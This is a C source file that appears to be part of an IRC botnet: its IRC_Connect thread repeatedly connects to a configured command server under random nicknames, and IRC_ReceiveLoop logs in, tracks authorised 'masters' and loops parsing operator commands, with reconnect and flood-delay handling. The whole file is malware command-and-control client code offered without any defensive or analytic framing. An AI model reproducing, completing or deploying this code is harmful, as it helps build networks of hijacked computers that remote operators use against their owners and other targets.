#include "includes.h"
#include "functions.h"
#include "externs.h"

DWORD WINAPI IRC_Connect(LPVOID param)
{
	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	int rval = 0;

	SOCKADDR_IN ssin;
	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0)
			break;

		memset(threads[irc.threadnum].nick, 0, sizeof(threads[irc.threadnum].nick));
		rndnick(threads[irc.threadnum].nick, nicktype, nickprefix);

		if ((threads[irc.threadnum].sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
			Sleep(5000);
			continue;
		}

		if (fconnect(threads[irc.threadnum].sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(threads[irc.threadnum].sock);
			FlushDNSCache();
			Sleep(5000);
			continue;
		}

		#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
		#endif
		addlogv("[MAIN]: Connected to %s.", irc.host);

		rval = IRC_ReceiveLoop(threads[irc.threadnum].sock, irc.host, irc.channel, irc.chanpass, threads[irc.threadnum].nick, irc.clone);
		fclosesocket(threads[irc.threadnum].sock);

		if (rval == 0) 
			continue;
		else if (rval == 1) {
			Sleep(900000);
			continue;
		}
		else if (rval == 2) 
			break;
	}
	clearthread(irc.threadnum);

	return rval;
}

int IRC_ReceiveLoop(SOCKET sock, char *server, char *channel, char *chanpass, char *nick, int clone)
{
	char buffer[4096], masters[MAXLOGINS][MAXIDENT], *lines[MAX_LINES], nickbuf[MAXNICKLEN], host[MAXHOSTNAME];
	int i, numlines, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(buffer, "NICK %s\r\nUSER %s 0 0 :%s\r\n", nick, rndnick(nickbuf,LETTERNICK, FALSE), nick);
	if (fsend(sock, buffer, strlen(buffer), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	while(1) {
		memset(buffer, 0, sizeof(buffer));
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
			break;

		// FIX ME: Truncation occurs here
		numlines = Split(buffer,&lines);
		for (i=0;i < numlines ;i++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				debuglog(lines[i]);
				#endif
				#ifdef DEBUG_CONSOLE
				printf("%s\n",lines[i]);
				#endif

				if (lines[i] != NULL) 
					repeat = IRC_ProtocolParse(lines[i], sock, server, channel, chanpass, nick, host, masters, &in_channel, repeat, clone);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}
